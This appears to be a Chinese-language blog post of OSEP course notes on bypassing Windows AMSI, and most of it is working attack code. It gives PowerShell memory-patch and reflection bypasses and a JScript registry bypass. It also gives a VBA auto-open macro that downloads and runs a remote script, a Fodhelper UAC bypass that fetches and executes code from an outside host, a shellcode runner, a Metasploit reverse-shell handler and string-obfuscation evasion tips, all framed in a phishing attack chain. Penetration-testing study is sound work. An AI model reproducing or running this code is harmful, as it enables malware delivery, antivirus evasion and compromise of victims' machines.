---
title: OSEP-08-AMSI绕过完整指南
description: '08-AMSI绕过 | 07-AMSI绕过完整指南'
pubDate: 2026-01-30T00:01:20+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# AMSI 绕过技术 - 完整指南

## 写在前面

AMSI（Antimalware Scan Interface）是 Windows 10 引入的安全机制，用于检测脚本中的恶意代码。作为渗透测试人员，理解 AMSI 的工作原理和绕过方法是必备技能。

**警告**：这些技术仅用于授权的渗透测试和安全研究。

**Web 安全类比**：
- AMSI 就像是 WAF（Web 应用防火墙），检查所有输入
- AMSI 绕过就像是 WAF 绕过，需要理解检测机制

---

## 第一部分：AMSI 基础

### 1.1 什么是 AMSI？

```
AMSI (Antimalware Scan Interface)
┌─────────────────────────────────────────────────────────────┐
│  AMSI 是 Windows 提供的接口，允许应用程序将内容发送给       │
│  杀毒软件进行扫描                                           │
│                                                             │
│  支持 AMSI 的应用：                                         │
│  - PowerShell                                               │
│  - Windows Script Host (JScript, VBScript)                  │
│  - Office VBA 宏                                            │
│  - .NET Framework 4.8+                                      │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 AMSI 的工作流程

```
PowerShell 执行脚本
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│  1. AmsiInitialize - 初始化 AMSI                            │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  2. AmsiOpenSession - 打开扫描会话                          │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  3. AmsiScanBuffer/AmsiScanString - 扫描内容                │
│     将脚本内容发送给杀毒软件                                 │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  4. 杀毒软件返回扫描结果                                    │
│     - 1 = 安全                                              │
│     - 32768 = 恶意                                          │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  5. AmsiCloseSession - 关闭会话                             │
└─────────────────────────────────────────────────────────────┘
```

### 1.3 AMSI 关键 API

| API | 作用 |
|-----|------|
| `AmsiInitialize` | 初始化 AMSI |
| `AmsiOpenSession` | 打开扫描会话 |
| `AmsiScanBuffer` | 扫描二进制缓冲区 |
| `AmsiScanString` | 扫描字符串 |
| `AmsiCloseSession` | 关闭会话 |
| `AmsiUninitialize` | 清理 AMSI |

### 1.4 使用 Frida 监控 AMSI

```bash
# 安装 Frida
pip install frida-tools

# 监控 PowerShell 的 AMSI 调用
frida-trace -p <PID> -x amsi.dll -i Amsi*
```

---

## 第二部分：AMSI 绕过原理

### 2.1 绕过思路

```
绕过 AMSI 的几种方法：

1. 修改 AMSI 函数代码
   ┌─────────────────────────────────────────────────────────┐
   │  修改 AmsiScanBuffer 或 AmsiOpenSession 的代码          │
   │  让它们直接返回"安全"结果                               │
   └─────────────────────────────────────────────────────────┘

2. 修改 AMSI 上下文
   ┌─────────────────────────────────────────────────────────┐
   │  破坏 amsiContext 结构，使 AMSI 初始化失败              │
   └─────────────────────────────────────────────────────────┘

3. 卸载 AMSI DLL
   ┌─────────────────────────────────────────────────────────┐
   │  从进程中卸载 amsi.dll                                  │
   └─────────────────────────────────────────────────────────┘

4. 注册表禁用
   ┌─────────────────────────────────────────────────────────┐
   │  设置注册表键禁用 AMSI（仅适用于 JScript）              │
   └─────────────────────────────────────────────────────────┘
```

### 2.2 AmsiOpenSession 绕过原理

```
AmsiOpenSession 函数开头的汇编代码：

原始代码：
00007fff`c3a224c0  test    rdx, rdx      ; 检查参数
00007fff`c3a224c3  je      amsi!AmsiOpenSession+0x4b
00007fff`c3a224c5  test    rcx, rcx
...

修改后：
00007fff`c3a224c0  xor     rax, rax      ; RAX = 0 (成功)
00007fff`c3a224c3  ret                   ; 直接返回
...

效果：函数直接返回 0（成功），但实际上什么都没做
```

---

## 第三部分：PowerShell AMSI 绕过

### 3.1 方法一：修改 AmsiOpenSession

```powershell
# ============================================================
# PowerShell AMSI 绕过 - 修改 AmsiOpenSession
# 使用反射技术，完全内存执行
# ============================================================

# LookupFunc - 查找 Win32 API 地址
function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object {
            $_.GlobalAssemblyCache -And
            $_.Location.Split('\\')[-1].Equals('System.dll')
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If($_.Name -eq "GetProcAddress") { $tmp += $_ }
    }

    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}

# getDelegateType - 创建委托类型
function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        ).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType(
            'MyDelegateType',
            'Class, Public, Sealed, AnsiClass, AutoClass',
            [System.MulticastDelegate]
        )

    $type.
        DefineConstructor(
            'RTSpecialName, HideBySig, Public',
            [System.Reflection.CallingConventions]::Standard,
            $func
        ).
        SetImplementationFlags('Runtime, Managed')

    $type.
        DefineMethod(
            'Invoke',
            'Public, HideBySig, NewSlot, Virtual',
            $delType,
            $func
        ).
        SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

# ===== 主代码 =====

# 1. 获取 AmsiOpenSession 地址
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession

# 2. 修改内存保护为可写
$oldProtectionBuffer = 0
$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualProtect),
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool]))
)
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

# 3. 写入 patch (xor rax, rax; ret)
# 0x48, 0x31, 0xC0 = xor rax, rax
$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

# 4. 恢复内存保护
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

Write-Host "[+] AMSI bypassed!"
```

### 3.2 方法二：修改 AmsiScanBuffer

```powershell
# ============================================================
# PowerShell AMSI 绕过 - 修改 AmsiScanBuffer
# ============================================================

# 获取 AmsiScanBuffer 地址
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0

# 修改内存保护
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)

# 写入 patch
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
# 0xB8 = mov eax, imm32
# 0x57, 0x00, 0x07, 0x80 = 0x80070057 (E_INVALIDARG)
# 0xC3 = ret
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

Write-Host "[+] AMSI bypassed!"
```

### 3.3 方法三：破坏 amsiContext

```powershell
# ============================================================
# PowerShell AMSI 绕过 - 破坏 amsiContext
# ============================================================

$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)

Write-Host "[+] AMSI bypassed!"
```

### 3.4 方法四：设置 amsiInitFailed

```powershell
# ============================================================
# PowerShell AMSI 绕过 - 设置 amsiInitFailed
# ============================================================

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Write-Host "[+] AMSI bypassed!"
```

---

## 第四部分：JScript AMSI 绕过

### 4.1 注册表方法

JScript 在启动时会检查注册表键，如果设置为 0 则禁用 AMSI：

```
注册表路径：
HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable

值：0 = 禁用 AMSI
```

### 4.2 PowerShell 设置注册表

```powershell
# 创建注册表键禁用 JScript AMSI
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Name "AmsiEnable" -Value 0 -PropertyType DWORD -Force
```

### 4.3 在 JScript 中设置

```javascript
// JScript AMSI 绕过 - 设置注册表
var WshShell = new ActiveXObject("WScript.Shell");
WshShell.RegWrite("HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable", 0, "REG_DWORD");

// 注意：需要重新启动 wscript.exe 才能生效
```

---

## 第五部分：与 VBA 宏结合

### 5.1 在 VBA 中执行 AMSI 绕过

```vba
Sub Document_Open()
    BypassAMSI
End Sub

Sub AutoOpen()
    BypassAMSI
End Sub

Sub BypassAMSI()
    Dim str As String

    ' AMSI 绕过 + Shellcode Runner
    str = "powershell -ep bypass -w hidden -c """ & _
          "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);" & _
          "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/run.ps1')"""

    CreateObject("WScript.Shell").Run str, 0
End Sub
```

### 5.2 完整攻击流程

```
1. 创建 run.ps1（包含 shellcode runner）
   放到 Web 服务器

2. 创建 Word 文档
   包含 AMSI 绕过 + 下载执行的 VBA 宏

3. 启动 Metasploit 监听器
   配置 stage 编码避免检测

4. 发送钓鱼邮件

5. 受害者打开文档
   → VBA 执行
   → AMSI 被绕过
   → 下载并执行 shellcode
   → 获得 shell
```

---

## 第六部分：UAC 绕过与 AMSI

### 6.1 Fodhelper UAC 绕过

```powershell
# Fodhelper UAC 绕过 + AMSI 绕过

# 1. 创建注册表键
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.1.100/run.ps1') | IEX" -Force

# 2. 创建 DelegateExecute 值
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force

# 3. 启动 fodhelper.exe
C:\Windows\System32\fodhelper.exe
```

### 6.2 run.ps1 内容（包含 AMSI 绕过）

```powershell
# run.ps1 - AMSI 绕过 + Shellcode Runner

# AMSI 绕过
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Shellcode Runner（使用反射技术）
function LookupFunc { ... }
function getDelegateType { ... }

# 分配内存
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualAlloc),
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Shellcode
[Byte[]] $buf = @(0xfc,0x48,0x83,0xe4,0xf0)  # 实际使用时替换为完整 shellcode

# 复制并执行
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CreateThread),
    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll WaitForSingleObject),
    (getDelegateType @([IntPtr], [Int32]) ([Int]))
).Invoke($hThread, 0xFFFFFFFF)
```

---

## 第七部分：Metasploit Stage 编码

### 7.1 为什么需要 Stage 编码？

即使绕过了 AMSI，Windows Defender 仍然可能检测到 Meterpreter 的第二阶段 payload。

### 7.2 配置 Stage 编码

```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 192.168.1.100
msf6 exploit(multi/handler) > set LPORT 443

# 启用 Stage 编码
msf6 exploit(multi/handler) > set EnableStageEncoding true
msf6 exploit(multi/handler) > set StageEncoder x64/zutto_dekiru

msf6 exploit(multi/handler) > exploit -j
```

---

## 第八部分：检测与防御

### 8.1 AMSI 绕过的检测点

| 检测点 | 说明 |
|--------|------|
| 内存修改 | 监控 amsi.dll 的内存修改 |
| 反射调用 | 检测对 AmsiUtils 的反射访问 |
| 注册表修改 | 监控 AmsiEnable 键的修改 |
| 可疑字符串 | 检测 "amsiInitFailed" 等字符串 |

### 8.2 绕过检测的技巧

1. **字符串混淆**：避免直接使用 "amsi" 等关键字
2. **编码**：使用 Base64 或其他编码
3. **分割字符串**：将关键字分割后拼接
4. **反射**：使用反射避免直接引用

---

## 第九部分：练习题

### 选择题

1. AMSI 的主要作用是什么？
   - A) 加密网络流量
   - B) 扫描脚本中的恶意代码
   - C) 管理用户权限
   - D) 监控文件系统

2. AmsiScanBuffer 返回 32768 表示什么？
   - A) 扫描成功
   - B) 代码安全
   - C) 代码被标记为恶意
   - D) 扫描失败

3. 哪个方法可以在 JScript 中绕过 AMSI？
   - A) 修改 AmsiOpenSession
   - B) 设置 amsiInitFailed
   - C) 设置注册表 AmsiEnable=0
   - D) 卸载 amsi.dll

4. VirtualProtect 的作用是什么？
   - A) 分配内存
   - B) 修改内存保护属性
   - C) 释放内存
   - D) 复制内存

5. 为什么需要 Stage 编码？
   - A) 加快传输速度
   - B) 避免 Windows Defender 检测第二阶段 payload
   - C) 减小 payload 大小
   - D) 提高稳定性

### 答案

1-B, 2-C, 3-C, 4-B, 5-B

---

## 下一步

掌握了 AMSI 绕过技术后，继续学习 [09-应用白名单绕过](/blog/osep/09-应用白名单绕过/00-章节指南/) 技术，了解如何绑定 AppLocker 等应用控制机制。
